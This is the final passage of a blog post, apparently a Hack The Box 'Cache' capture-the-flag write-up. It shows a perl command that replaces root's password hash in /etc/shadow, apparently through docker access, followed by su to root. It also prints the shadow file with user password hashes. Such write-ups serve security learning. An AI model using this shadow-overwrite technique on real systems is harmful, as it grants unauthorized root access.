$6$saltsalt$qFmFH.bQmmtXzyBY0s9v7Oicd2z4XSIecDzlB5KiA2/jctKu9YterLp8wwnSq.qc.eoxqOmSuNp2xS0ktL3nh/
</code></pre></div>
<p>And then put the new hash value in a new file <code>/etc/shadow.new</code>, check it and
then replace the original <code>/etc/shadow</code> file. One the new value is set we can
exit the docker and switch user to root.</p>
<div class="highlight"><pre><span></span><code># perl -pe 's|(root):(\$.*?:)|\1:\$6\$SALTsalt\$UiZikbV3VeeBPsg8./Q5DAfq9aj7CVZMDU6ffBiBLgUEpxv7LMXKbcZ9JSZnYDrZQftdG319XkbLVMvWcF/Vr/:|' /etc/shadow &gt; /etc/shadow.new
perl -pe 's|(root):(\$.*?:)|\1:\$6\$SALTsalt\$UiZikbV3VeeBPsg8./Q5DAfq9aj7CVZMDU6ffBiBLgUEpxv7LMXKbcZ9JSZnYDrZQftdG319XkbLVMvWcF/Vr/:|' /etc/shadow &gt; /etc/shadow.new
# cat /etc/shadow.new
cat /etc/shadow.new
root:$6$SALTsalt$UiZikbV3VeeBPsg8./Q5DAfq9aj7CVZMDU6ffBiBLgUEpxv7LMXKbcZ9JSZnYDrZQftdG319XkbLVMvWcF/Vr/:18178:0:99999:7:::
daemon:*:17941:0:99999:7:::
bin:*:17941:0:99999:7:::
sys:*:17941:0:99999:7:::
sync:*:17941:0:99999:7:::
games:*:17941:0:99999:7:::
man:*:17941:0:99999:7:::
lp:*:17941:0:99999:7:::
mail:*:17941:0:99999:7:::
news:*:17941:0:99999:7:::
uucp:*:17941:0:99999:7:::
proxy:*:17941:0:99999:7:::
www-data:*:17941:0:99999:7:::
backup:*:17941:0:99999:7:::
list:*:17941:0:99999:7:::
irc:*:17941:0:99999:7:::
gnats:*:17941:0:99999:7:::
nobody:*:17941:0:99999:7:::
systemd-network:*:17941:0:99999:7:::
systemd-resolve:*:17941:0:99999:7:::
syslog:*:17941:0:99999:7:::
messagebus:*:17941:0:99999:7:::
_apt:*:17941:0:99999:7:::
lxd:*:17941:0:99999:7:::
uuidd:*:17941:0:99999:7:::
dnsmasq:*:17941:0:99999:7:::
landscape:*:17941:0:99999:7:::
pollinate:*:17941:0:99999:7:::
sshd:*:18156:0:99999:7:::
ash:$6$xXLd6jlN$b37bISaMTwk2uxlpOsRFlJYmNMzFPlSb.7nD2oSzhjtdikwne5j17lAtfwKP0jyfaScDgLKFn9gyPvxg57NcS.:18157:0:99999:7:::
luffy:$6$aPEHFC8D$9ZWqYH2UuImmKRLWA7ZBzSWiBiGLUmXCn7BBpcFq5quVXIj6mA0QtiGwH8opTZ53AzpgnPhaOGq4i1SaRlBlP/:18157:0:99999:7:::
memcache:!:18157:0:99999:7:::
mysql:!:18219:0:99999:7:::
# mv /etc/shadow.new /etc/shadow    
mv /etc/shadow.new /etc/shadow
# exit
exit
luffy@cache:~$ su
su
Password: password

root@cache:/home/luffy#
</code></pre></div>
<h1>Wrapping up</h1>
<p>The box was overall interesting. The root part was really nice as it chained the
memcache "exploitation" and the "docker" one.</p>
</div>
<div class="tag-cloud">
<p>
<a href="../../tag/security.html">security</a>
<a href="../../tag/boot2root.html">boot2root</a>
<a href="../../tag/htb.html">HTB</a>
<a href="../../tag/linux.html">Linux</a>
<a href="../../tag/openemr.html">openEMR</a>
<a href="../../tag/docker.html">docker</a>
<a href="../../tag/memcache.html">memcache</a>
</p>
</div>
<div class="neighbors">
<a class="btn float-left" href="../../2020/09/htb-admirer.html" title="HTB: Admirer">
<i class="fa fa-angle-left"></i> Previous Post
    </a>
<a class="btn float-right" href="../../2020/10/htb-blunder.html" title="HTB: Blunder">
      Next Post <i class="fa fa-angle-right"></i>
</a>
</div>
</article>
<footer>
<p>
  © 2024  - This work is licensed under a <a href="http://creativecommons.org/licenses/by/4.0/deed.en_US" rel="license" target="_blank">Creative Commons Attribution</a>
</p>
<p>
Built with <a href="http://getpelican.com" target="_blank">Pelican</a> using <a href="http://bit.ly/flex-pelican" target="_blank">Flex</a> theme
  <span class="footer-separator">|</span>
  Switch to the <a href="javascript:void(0)" onclick="theme.switch(`dark`)">dark</a> | <a href="javascript:void(0)" onclick="theme.switch(`light`)">light</a> | <a href="javascript:void(0)" onclick="theme.switch(`browser`)">browser</a> theme
  <script data-default-theme="light" data-enable-auto-detect-theme="True" id="dark-theme-script" src="../../theme/dark-theme/dark-theme.min.js" type="text/javascript">
</script>
</p><p>
<a href="http://creativecommons.org/licenses/by/4.0/" rel="license" target="_blank">
<img alt="Creative Commons License" height="15" src="https://i.creativecommons.org/l/by/4.0/80x15.png" style="border-width:0" title="Creative Commons License" width="80">
</img></a>
</p></footer> </main>
<script type="application/ld+json">
{
  "@context" : "http://schema.org",
  "@type" : "Blog",
  "name": " maggick's logs ",
  "url" : "../..",
  "image": "https://maggick.fr/media/image.png",
  "description": ""
}
</script>
</body>
</html>